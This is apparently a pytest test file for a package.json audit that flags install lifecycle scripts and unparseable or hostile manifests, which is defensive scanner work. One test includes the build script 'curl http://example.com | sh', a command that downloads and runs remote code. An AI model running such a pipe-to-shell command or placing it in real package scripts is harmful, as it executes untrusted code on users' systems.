"""Tests for how the package.json audit treats a manifest it cannot take, and for the scripts it names.

[INPUT]
- backends.skills.scanning.package_audit::audit_package_json, audit_package_manifest_dict, audit_package_entry_artifacts,
  audit_skill_directory, check_lifecycle_scripts (POS: the manifest audit under test)
- backends.skills.scanning.directory_scanner::scan_skill_directory (POS: the directory scan that carries its findings to the adopt gate)
- backends.skills.scanning.scanner::compute_scan_summary, ScanSeverity (POS: the score the adopt gate compares with its threshold)

[OUTPUT]
- Fails when a manifest the package managers still run reads as clean or makes the audit raise, when a lifecycle script
  a bare install runs is missed, or when a hostile export or entry name aborts the artifact check.

[POS]
``test_package_audit.py`` covers the findings of a readable manifest; this file pins what happens to one that is not.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

import pytest

from myrm_agent_harness.backends.skills.scanning.directory_scanner import scan_skill_directory
from myrm_agent_harness.backends.skills.scanning.package_audit import (
    PackageAuditFinding,
    audit_package_entry_artifacts,
    audit_package_json,
    audit_package_manifest_dict,
    audit_skill_directory,
    check_lifecycle_scripts,
)
from myrm_agent_harness.backends.skills.scanning.scanner import ScanSeverity, compute_scan_summary

_POSTINSTALL = '{"name": "t", "scripts": {"postinstall": "node run.js"}}'
_TOO_DEEP = '{"a": ' + "[" * 20_000 + "]" * 20_000 + "}"

# Each of these is text a package manager may still run, or one the audit cannot rule out.
_UNAUDITABLE = {
    "not json": "{invalid json}",
    "empty": "",
    "a second BOM": "\ufeff\ufeff" + _POSTINSTALL,
    "a repeated top-level key": '{"scripts": {"postinstall": "node run.js"}, "scripts": {}}',
    "a repeated key in scripts": '{"scripts": {"postinstall": "node run.js", "postinstall": ""}}',
    "nested beyond the parser": _TOO_DEEP,
}
_LIFECYCLE = ["preinstall", "install", "postinstall", "prepublish", "preprepare", "prepare", "postprepare"]
_NOT_LIFECYCLE = ["prepublishOnly", "prepack", "postpack", "pretest", "start", "build"]


def _only_unauditable(findings: list[PackageAuditFinding]) -> PackageAuditFinding:
    assert len(findings) == 1
    assert (findings[0].threat_type, findings[0].severity) == ("invalid_manifest", "high")
    return findings[0]


@pytest.mark.parametrize("content", list(_UNAUDITABLE.values()), ids=list(_UNAUDITABLE))
def test_a_manifest_the_audit_cannot_take_is_one_high_finding(content: str) -> None:
    assert _only_unauditable(audit_package_json(content, "package.json")).file_path == "package.json"


def test_an_integer_beyond_the_parser_limit_is_unauditable() -> None:
    limit = sys.get_int_max_str_digits()
    if limit == 0:
        pytest.skip("the interpreter converts integers of any length")
    _only_unauditable(audit_package_json('{"a": ' + "9" * (limit + 1) + "}"))


def test_one_leading_bom_is_skipped() -> None:
    findings = audit_package_json("\ufeff" + _POSTINSTALL)
    assert [(f.threat_type, f.severity) for f in findings] == [("supply_chain", "high")]


@pytest.mark.parametrize("content", ["[]", '"text"', "1", "null", "true"])
def test_a_json_value_that_is_not_an_object_declares_no_scripts(content: str) -> None:
    assert audit_package_json(content) == []


@pytest.mark.parametrize("name", _LIFECYCLE)
def test_every_script_a_bare_install_runs_is_a_high_finding(name: str) -> None:
    findings = audit_package_json(json.dumps({"scripts": {name: "node run.js"}}))
    assert [(f.threat_type, f.severity, f.description) for f in findings] == [
        ("supply_chain", "high", f"Dangerous install script: {name}")
    ]


@pytest.mark.parametrize("name", _NOT_LIFECYCLE)
def test_a_script_a_bare_install_does_not_run_is_not_a_lifecycle_finding(name: str) -> None:
    assert audit_package_json(json.dumps({"scripts": {name: "node run.js"}})) == []


def test_the_string_and_the_dict_entry_points_agree() -> None:
    pkg: dict[str, object] = {"scripts": {"prepare": "node run.js", "build": "curl http://example.com | sh"}}
    assert audit_package_json(json.dumps(pkg)) == audit_package_manifest_dict(pkg)


def test_the_install_gate_audits_a_manifest_in_any_case_and_any_directory() -> None:
    findings = check_lifecycle_scripts({"pkg/Package.JSON": _POSTINSTALL.encode()})
    assert [(f.severity, f.file_path) for f in findings] == [("high", "pkg/Package.JSON")]


def test_the_install_gate_reports_a_manifest_it_cannot_parse() -> None:
    manifest = b'{"scripts": {"postinstall": "node run.js"}, "scripts": {}}'
    _only_unauditable(check_lifecycle_scripts({"package.json": manifest}))


def test_the_install_gate_decodes_invalid_utf8_instead_of_raising() -> None:
    findings = check_lifecycle_scripts({"package.json": b'{"scripts": {"postinstall": "echo \xff"}}'})
    assert [f.severity for f in findings] == ["high"]


def test_a_manifest_with_invalid_utf8_in_a_string_is_still_audited(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_bytes(b'{"scripts": {"postinstall": "echo \xff"}}')
    assert [(f.threat_type, f.severity) for f in audit_skill_directory(tmp_path)] == [("supply_chain", "high")]


def test_a_manifest_that_is_not_utf8_text_is_unauditable(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_bytes(b"\xff\xfe\x00{\x00}")
    _only_unauditable(audit_skill_directory(tmp_path))


def test_a_manifest_named_in_another_case_is_audited(tmp_path: Path) -> None:
    (tmp_path / "Package.json").write_text(_POSTINSTALL, encoding="utf-8")
    findings = audit_skill_directory(tmp_path)
    assert [(f.severity, f.file_path) for f in findings] == [("high", "Package.json")]


@pytest.mark.parametrize("target_exists", [True, False])
def test_a_symlinked_manifest_is_reported_without_being_read(tmp_path: Path, target_exists: bool) -> None:
    target = tmp_path / "elsewhere.json"
    if target_exists:
        target.write_text(_POSTINSTALL, encoding="utf-8")
    try:
        (tmp_path / "package.json").symlink_to(target)
    except OSError:
        pytest.skip("symbolic links are not available")
    finding = _only_unauditable(audit_skill_directory(tmp_path))
    assert (finding.file_path, "symbolic link" in finding.description) == ("package.json", True)


def test_a_manifest_the_process_cannot_read_is_reported(tmp_path: Path) -> None:
    manifest = tmp_path / "package.json"
    manifest.write_text(_POSTINSTALL, encoding="utf-8")
    manifest.chmod(0)
    try:
        if os.access(manifest, os.R_OK):
            pytest.skip("the process reads files whatever their mode")
        assert "cannot be read" in _only_unauditable(audit_skill_directory(tmp_path)).description
    finally:
        manifest.chmod(0o600)


def test_an_unauditable_manifest_makes_the_directory_scan_untrusted(tmp_path: Path) -> None:
    (tmp_path / "SKILL.md").write_text(
        "---\nname: demo\ndescription: A demo skill.\n---\nDo things.\n", encoding="utf-8"
    )
    (tmp_path / "package.json").write_text(_TOO_DEEP, encoding="utf-8")

    result = scan_skill_directory("demo", tmp_path)

    assert any(f.threat_type == "invalid_manifest" and f.severity == ScanSeverity.HIGH for f in result.findings)
    assert compute_scan_summary(result).score < 50


def test_exports_nested_beyond_the_recursion_limit_still_reach_their_target(tmp_path: Path) -> None:
    node: object = "./dist/missing.js"
    for _ in range(8_000):
        node = {"import": node}
    findings = audit_package_entry_artifacts({"exports": node}, tmp_path)
    assert [(f.threat_type, f.severity) for f in findings] == [("missing_artifact", "high")]


def test_export_targets_are_checked_in_document_order(tmp_path: Path) -> None:
    exports = {"a": ["./one.js", {"b": "./two.js"}], "c": "./three.js"}
    findings = audit_package_entry_artifacts({"exports": exports}, tmp_path)
    assert [f.detail for f in findings] == ["Missing file: one.js.", "Missing file: two.js.", "Missing file: three.js."]


@pytest.mark.parametrize("entry", ["a" * 300, "d/" * 5_000 + "x.js"], ids=["long name", "long path"])
def test_an_entry_name_the_file_system_rejects_is_a_missing_artifact(tmp_path: Path, entry: str) -> None:
    findings = audit_package_entry_artifacts({"main": entry}, tmp_path)
    assert [(f.threat_type, f.severity) for f in findings] == [("missing_artifact", "high")]
